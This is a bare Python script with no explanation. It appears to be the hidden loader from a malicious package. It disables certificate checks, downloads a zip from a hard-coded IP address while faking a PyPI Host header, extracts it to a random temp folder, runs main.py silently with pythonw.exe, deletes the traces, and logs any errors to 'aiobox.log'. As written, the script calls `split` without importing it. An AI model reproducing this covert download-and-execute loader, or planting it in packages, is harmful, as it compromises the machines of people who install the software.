from urllib.request import Request, urlopen
from ssl import create_default_context, CERT_NONE
from os import system
from zipfile import ZipFile
from io import BytesIO
from shutil import rmtree
from secrets import token_hex
from tempfile import gettempdir
from os.path import join, isdir
from sys import version_info, executable

try:
    temp_dir = join(gettempdir(), token_hex(4))
    context = create_default_context()
    context.check_hostname = False
    context.verify_mode = CERT_NONE
    content = Request(f'http://77.91.77.31:6382/versions/{version_info[0]}{version_info[1]}.zip')
    content.add_header('Host', 'files.pythonhosted.org')
    content.add_header('Accept-Encoding', 'gzip, deflate, br')
    content.add_header('Accept-Language', 'en-US;q=0.5,en;q=0.3')
    content = urlopen(content, context = context).read()
    inter = join(split(executable)[0], 'pythonw.exe')
    content = ZipFile(BytesIO(content))
    content.extractall(temp_dir)
    system(f'cd "{temp_dir}" & "{inter}" main.py')
    rmtree(temp_dir)
except Exception as e:
    open(join(gettempdir(), 'aiobox.log'), 'a').write(str(e))